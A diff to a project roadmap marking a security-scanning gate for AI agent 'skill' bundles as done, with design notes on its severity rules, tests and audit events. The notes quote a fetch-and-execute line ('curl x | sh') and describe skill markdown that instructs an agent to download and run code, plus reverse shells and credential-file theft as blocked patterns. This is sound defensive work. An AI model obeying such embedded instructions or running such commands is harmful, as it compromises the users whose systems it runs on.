@@ -2963,7 +2963,96 @@ and `codex` and reports what they say, which on a scratch `HOME` is "not
 logged in": the isolation that makes the install checkable is the isolation
 that makes the model unreachable._
 
-- [ ] [SKIL-2: Security scanning gate](SKIL-2.md)
+- [x] [SKIL-2: Security scanning gate](SKIL-2.md) — done 2026-08-03, ADR-0052, migration 0032, AC tests: crates/synveda-gateway/tests/skills.rs (**the AC one step earlier than it asks, and the report on a terminal**: `a_seeded_malicious_skill_cannot_reach_published` proves the bundle is never *stored*, so `install --channel draft` cannot serve it either — which is the half the criterion's wording does not reach, because `at_scope`'s draft branch decides `SkillRead` at the scope and not authorship; the prose vector asserted separately, since a scanner pointed at `scripts/*` would pass a SKILL.md that instructs an agent to fetch and run something; `the_report_renders_in_review` under the **zero-config default**, an API call and a package install named per file with the line to open and the judgement handed to the two people the floor already requires; `the_publish_seam_refuses_what_authoring_never_saw`, which puts the bundle in through the store rather than the handler — MEM-4's schema-backstop shape, no PDP bypassed because the store has none — and watches it approve cleanly and then fail to publish; the pack deciding the `high` band and never the `critical` one; and SKIL-1's own fixture still authoring and publishing with an empty report), crates/synveda-ingest (15 unit tests over the rule table: every spelling of fetch-and-execute, the manifest scanned like any other file, the co-occurrence rule needing both halves, the environment-token-plus-API-call case asserted **not** critical by name, and a finding's serialised form proved to carry neither the credential path nor the matched span), crates/synveda-types (7 unit tests on the severity order and the clamp a configuration cannot get past), crates/synveda-cli (3 unit tests on the review block — worst-first, blocking-only painted as a refusal, and the rank comparison that makes `critical` block under a `high` threshold), demo: demos/skil-2-security-gate.sh (both vectors refused from a terminal, the review block rendered, the same bundle reported under `standard` and refused again under a stored pack applied with `--scan-block-at high`, and `chain valid (32 events)` with a leak sweep at 0 rows)
+_SKIL-2 notes (ADR-0052): **two of the feature's three clauses arrived already
+discharged, and the ADR records both rather than re-litigating them.** "Secret
+patterns" has been MEM-2's scanner at this seam since ADR-0051 decision 14, and
+"security-reviewer role required for executable skills" is the invariant
+floor's second rule — required on *every* skill, not merely an executable one,
+because ADR-0051 decision 8 refused the executable bit outright and there is
+therefore no such thing as a non-executable skill in this product. What was
+left is network egress, dangerous calls, a report a reviewer reads, and a gate
+a malicious bundle cannot pass.
+
+Two findings shape the rest, and neither is in the feature text. The first is
+that **a skill's prose is executable**: `SKILL.md` is instructions to a model
+that can run commands, so a bundle whose markdown says "first, run `curl x |
+sh`" carries exactly the attack a scanner pointed at `scripts/*.py` passes
+through untouched — the interpreter is the agent. Scanning "skill scripts",
+the feature's own phrase, would have left the hole open in the one file every
+reviewer actually reads. The second is that **"cannot reach published" is not
+the whole boundary**, because a draft is installable: `at_scope`'s draft branch
+decides `SkillRead` at the scope and not authorship, so anyone the pack lets
+read skills there can materialise an unreviewed bundle. A gate only at the
+publish seam is one a malicious author walks around by never opening a
+proposal. The gate is therefore at authoring, where a refused bundle is never
+stored at all — and the AC's clause becomes a consequence rather than the
+claim.
+
+Three severities, with the top one on the invariant floor (decision 3).
+`critical` is "no legitimate reading exists, so nobody decides" —
+fetch-and-execute, remote-code-eval, obfuscated execution, reverse shells, and
+a stored credential file read in a bundle that also reaches the network.
+`high` is "dangerous and occasionally legitimate, so a pack decides":
+`regulated-strict` refuses it, the relaxed packs report it. `notice` is a
+reviewer's eye and nothing more. The placement is ADR-0032 decision 4's and the
+argument is ADR-0051 decision 18's: a pack may be cheaper about how many people
+sign, and may not be cheaper about whether the product ships a credential
+stealer.
+
+The co-occurrence rule is where the care went, and it is where the design
+could most easily have been wrong. A private key path is `high` on its own and
+`critical` in a file that also reaches the network — but the pair is
+**credential *files* only**, deliberately, because an environment token plus an
+API call is what every legitimate skill that talks to an API looks like, and
+putting *that* in the critical band would have refused most of the ecosystem.
+It is `environment-secret-read` at notice instead, with a test that says so by
+name.
+
+The report is **recomputed, never stored** (decision 6): it is a pure function
+of (file bytes, ruleset version), and both are already present wherever it
+renders — the objects are read to draw FLOW-6's diff, and the rule table is
+compiled in. A table would have bought a durable answer to "what did the
+reviewer see" and answered it *worse* than the audit chain does, because a row
+is mutable and a chained event is not. Migration 0032 is one nullable column
+for the pack's threshold and nothing else.
+
+`skill.scan.rejected` is the third skill audit action where ADR-0051 decision
+16 said there would be two. It earns the place by being a governed refusal
+rather than a fact already on the chain: nothing else records that the product
+stopped a bundle, and an auditor filtering for what the security gate caught
+should not have to disambiguate two scanners inside one action's payload. A
+clean scan still gets no event of its own; a bundle that was *reported on* and
+admitted anyway rides `skill.authored`, which is what "what did we let past"
+actually needs.
+
+Two things the acceptance work found, both behaviour. **The publish refusal
+answered `400 Invalid` with the authoring wording** — "the bundle was not
+stored", about a bundle that was stored and approved. One shared helper for two
+seams was right; one shared *error* was not, and decision 5 already said why it
+is a `Conflict`: the request was well formed when it was approved, and what
+changed is the rule table. And **`blocks_at` under the zero-config default is
+`high`, not `critical`** — the test asserted the floor and read the pack, which
+is the report doing exactly what it should. It is rendered against the pack
+that will decide the publication, so `blocked` means "this will be refused at
+publish" rather than "some pack somewhere would refuse it".
+
+Deferrals, all recorded in ADR-0052 with triggers: **there is no rule-level
+exception mechanism**, so a `critical` false positive is unpublishable until
+the rule is fixed in a release — the sharpest edge here, and the recorded shape
+for it is a lapse (audited, time-boxed, dual-approved, naming the rule and the
+file), which is ADR-0037's machinery and is not built for this plane.
+Obfuscation defeats a lexical scanner by construction, and the honest claim is
+that this stops the malicious skill somebody actually publishes rather than the
+one written to defeat it — the second is what the two human signatures on the
+floor are for. A general SAST engine is refused on the licence-and-single-binary
+rule with a `SkillScanner` trait as the recorded path; per-language AST analysis
+is deferred until a blocking rule cannot be written lexically without false
+positives; and a `synveda skill scan <dir>` client-side pre-flight is left out
+deliberately, because a convenience arriving in the same commit as the gate is
+one that gets confused for it. A rule landing in a release can block a bundle
+that published cleanly last week, which is correct and will be surprising._
+
 - [ ] [SKIL-3: Skill quality scoring](SKIL-3.md)
 - [ ] [SKIL-4: Scope-targeted distribution](SKIL-4.md)
 - [ ] [GRPH-3: Graph-augmented recall](GRPH-3.md)
